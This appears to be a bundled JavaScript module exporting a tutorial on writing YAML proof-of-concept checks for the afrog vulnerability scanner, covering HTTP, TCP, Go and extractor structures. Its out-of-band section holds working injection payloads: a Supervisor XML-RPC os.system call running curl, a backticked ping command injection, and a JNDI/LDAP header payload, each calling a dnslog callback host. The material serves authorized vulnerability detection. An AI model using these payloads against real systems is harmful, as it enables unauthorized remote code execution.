const n=`The Examples module aims to teach how to write PoCs for afrog through practical examples. Starting from simple to complex, it helps to gradually master the skills of writing PoCs.

afrog's PoCs can be categorized into three types: \`http\`, \`tcp/udp\`, and \`go\`. Among them, the majority of PoCs fall into the \`http\` category, so it is recommended to focus on learning this type during the learning process.

# afrog PoC Writing Tutorial

afrog is a powerful vulnerability scanning tool that supports user-defined Proof of Concept (PoC) writing. Writing your own PoCs can help you extend the functionality of afrog to meet specific vulnerability detection needs. Here is a brief afrog PoC writing tutorial to help you get started with writing your own PoCs.

1. Understand the PoC structure and syntax:
   - PoCs are written in YAML format.
   - They contain necessary information for vulnerability validation, such as vulnerability name, description, validation rules, etc.
   - You can refer to the [built-in PoCs in afrog](https://github.com/zan8in/afrog/tree/main/pocs/afrog-pocs) to understand their structure and syntax.

2. Create a new PoC file:
   - Use any text editor to create a new YAML file, e.g., \`my-poc.yaml\`.

3. Write the PoC content:
   - Fill in the necessary information for your PoC based on the vulnerability you want to validate.
   - Make sure to provide accurate vulnerability name, description, and validation rules.
   - Optionally, you can add other fields like impact scope, remediation recommendations, etc.

4. Save and test the PoC:
   - Save the written PoC to your local machine.
   - Run the afrog command in your terminal and specify the target URL using the \`-t\` parameter.
   - Use the \`-poc-file\` or \`-P\` parameter to specify the path to your written PoC file.
   - Run the afrog scan to validate if your PoC is effective.

5. Debug and optimize the PoC:
   - If any issues or unexpected results occur during the validation process, check the syntax and logic of your PoC.
   - You can use the \`-pd\` command provided by afrog to view the detailed content of a specific PoC for further debugging and optimization.

6. Contribute and share:
   - If your PoC successfully validates a vulnerability, consider contributing it to the afrog community.
   - You can submit a Pull Request to add your PoC to the official afrog repository and share your achievements with other users.

Please note that writing effective PoCs requires a certain level of security technical knowledge and experience. Ensure to follow legal and ethical guidelines when writing and using PoCs, and only use them within authorized scopes.

We hope this brief tutorial helps you get started with writing your own afrog PoCs. Good luck!

# Http PoC Structure

## Basic structure
The afrog PoC content consists of three main parts: \`id\`, \`info\`, and \`rules\`.

\`\`\`sh
id: xxx

info:
    xxxx

rules:
    xxxx
\`\`\`

## Id
The \`id\` serves as a unique identifier for the PoC, and it is recommended to keep the \`id\` concise and accurate. The official recommendation is to use CVE or CNVD naming conventions. If there is no vulnerability identifier available, it is suggested to follow the naming convention of \`Product Name\`-\`Product Version\`-\`Triggering Vulnerability Keyword\`-\`Vulnerability Name.yaml\`. 

For example, the name \`kingsoft-v8-get-file-content-file-read.yaml\` can be broken down as follows:

\`\`\`sh
id: kingsoft-v8-get-file-content-file-read
\`\`\`

1. \`kingsoft\` represents the product name, which is "金山" (Kingsoft).
2. \`v8\` represents the product version, which is "V8 终端安全系统" (V8 Terminal Security System).
3. \`get-file-content\` represents the key file name triggering the vulnerability, which is \`get_file_content.php\`.
4. \`file-read\` represents the vulnerability name, which is "任意文件读取漏洞" (Arbitrary File Read Vulnerability).

## Info

\`info\` is the basic information section of the PoC, which includes the following main components:

\`\`\`sh
id: CVE-2001-1473

info:
  name: Deprecated SSHv1 Protocol Detection
  author: demo
  severity: high
  verified: true
  description: SSHv1 is deprecated and has known cryptographic issues.
  affected: ssh-1
  solutions: Upgrade to SSH-2 or later.
  reference:
    - https://www.kb.cert.org/vuls/id/684820
    - https://nvd.nist.gov/vuln/detail/CVE-2001-1473
  tags: cve,cve2001,network,ssh,openssh
  created: 2022/01/21
\`\`\`

_**\`name\`, \`author\`, and \`severity\` are mandatory fields.**_


1. \`name\`: Vulnerability name. Unlike \`id\`, it does not have uniqueness restrictions, and the naming rules are not strict. It can be in English, Chinese, or any other language. Its main purpose is to provide a concise description of the vulnerability addressed by the PoC.

2. \`author\`: Author of the PoC.

3. \`severity\`: Vulnerability severity level, ranging from \`info\`, \`low\`, \`medium\`, \`high\`, to \`critical\` in ascending order of severity.

4. \`verified\`: Verification status. Setting it to \`true\` indicates that the PoC has been verified.

5. \`description\`: Detailed description of the vulnerability, highlighting its characteristics and impact.

6. \`affected\`: Affected scope, typically including the versions of the product that are vulnerable.

7. \`solutions\`: Recommendations and solutions for fixing the vulnerability.

8. \`reference\`: References and links to related articles. Note that this field should be filled in as an array.

9. \`tags\`: Keywords used for retrieval and categorization.

10. \`created\`: Creation time, documenting the date when the PoC was created.

## Rules

Basic structure, mainly includes the following contents:

\`\`\`sh
id: my-poc

info:
  name: My PoC demo
  author: zan8in
  severity: critical

rules:
  r0:
    request:
      method: GET
      path: /vulnerability-path
    expression: response.status == 200 && response.body.bcontains(b'Vulnerability')
expression: r0()
\`\`\`

# Tcp PoC Structure

## Basic structure

Basic structure, mainly includes the following contents:

\`\`\`sh
id: mysql-detect

info:
  name: MySQL detected
  author: zan8in
  severity: info
  verified: false

set:
  hostname: request.url.host
  host: request.url.domain
rules:
  r0:
    request:
      type: tcp
      host: "{{hostname}}"
      data: "\\n"
      read-size: 1024
    expression: response.raw.bcontains(b'No such') && response.raw.bcontains(b'lstat() failed')
  r1:
    request:
      type: tcp
      host: "{{host}}:3306"
      data: "\\n"
      read-size: 1024
    expression: response.raw.bcontains(b'No such') && response.raw.bcontains(b'lstat() failed')
expression: r0() || r1()
\`\`\`

# Go PoC Structure

## Basic structure

Basic structure, mainly includes the following contents:

\`\`\`sh
id: shiro-key-detect

info:
  name: Shiro key detection
  author: zan8in
  severity: critical
  verified: false

rules:
  r0:
    request:
      type: go
      data: shiro_key_detect
    expression: response.raw.bcontains(b'ShiroKey')
expression: r0()
\`\`\`

# OOB (Out of Band) Demo

Afrog provides a built-in \`oob\` variable for Out-of-Band verification. You can directly use \`{{oob.HTTP}}\` / \`{{oob.DNS}}\` in requests and wait for hits via \`oobWait(oob, protocol, timeout)\`.

OOB verification requires configuring an OOB adapter, [Configuration Tutorial](https://github.com/zan8in/afrog?tab=readme-ov-file#ceye-configuration)

#### OOB HTTP

\`\`\`yaml
id: oob-http-demo

info:
  name: OOB HTTP Demo
  author: zan8in
  severity: info
rules:
  r0:
    request:
      method: POST
      path: /rce.php
      body: |
        <?xml version="1.0"?>
        <methodCall>
          <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
          <params>
          <param>
          <string>curl {{oob.HTTP}}</string>
          </param>
          </params>
        </methodCall>
    expression: oobWait(oob, oob.ProtocolHTTP, 3)
expression: r0()
\`\`\`
request package
\`\`\`
POST /rce.php HTTP/1.1
Host: 192.168.66.166
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0"?>
<methodCall>
  <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
  <params>
  <param>
  <string>curl http://36sSyqGPGpMZ.xxyy.dnslogxx.sh</string>
  </param>
  </params>
</methodCall>
\`\`\`
#### OOB DNS

\`\`\`yaml
id: oob-dns-demo

info:
  name: OOB DNS Demo
  author: zan8in
  severity: info
rules:
  r0:
    request:
      method: GET
      path: /cmd=\`ping {{oob.DNS}}\`
    expression: oobWait(oob, oob.ProtocolDNS, 3)
expression: r0()
\`\`\`
request package
\`\`\`
GET /cmd=\`ping 36sSyqGPGpMZ.xxyy.dnslogxx.sh\` HTTP/1.1
Host: 192.168.66.166
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
\`\`\`

#### OOB JNDI

\`\`\`yaml
id: oob-jndi-demo

info:
  name: OOB JNDI Demo
  author: zan8in
  severity: info
rules:
  r0:
    request:
      method: GET
      path: /websso/SAML2/SSO/vsphere.local?SAMLRequest=
      headers:
        X-Forwarded-For: "\${jndi://{{oob.DNS}}}"
    expression: oobWait(oob, oob.ProtocolDNS, 3)
expression: r0()
\`\`\`
request package
\`\`\`
GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
Host: 192.168.66.166
X-Forwarded-For: \${jndi:ldap://x.x.x.x:1389/QW5qJX3cb16PKivauJxyWl}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
\`\`\`

# Extractor Demo

\`\`\`yaml
id: mysql-detect

info:
  name: MySQL Dectect
  author: zan8in
  severity: info
  verified: true
  description: MySQL instance was detected
  tags: network,db,mysql

set:
  host: request.url.domain
  hostname: request.url.host
rules:
  r0:
    request:
      type: tcp
      host: "{{hostname}}"
      data: "\\n"
    expression: |
      response.raw.ibcontains(b"mysql") || 
      response.raw.ibcontains(b"mariadb") ||
      "[0-9]\\\\.[0-9]{1,2}\\\\.[0-9]{1,2}".bmatches(response.raw)
    extractors:
      - type: regex
        extractor:
          ext1: '"(?P<mysql>[0-9]\\\\.[0-9]{1,2}\\\\.[0-9]{1,2})".bsubmatch(response.raw)'
          mysql: ext1["mysql"]
    
  r1:
    request:
      type: tcp
      host: "{{host}}:3306"
      data: "\\n"
    expression: |
      response.raw.ibcontains(b"mysql") || 
      response.raw.ibcontains(b"mariadb") ||
      "[0-9]\\\\.[0-9]{1,2}\\\\.[0-9]{1,3}".bmatches(response.raw)
    extractors:
      - type: regex
        extractor:
          ext1: '"(?P<mysql>[0-9]\\\\.[0-9]{1,2}\\\\.[0-9]{1,2})".bsubmatch(response.raw)'
          mysql: ext1["mysql"]

extractors:
  - type: word
    extractor:
      user: 'root'
      pass: "123456"
expression: r0() || r1() 
\`\`\`
`;export{n as default};
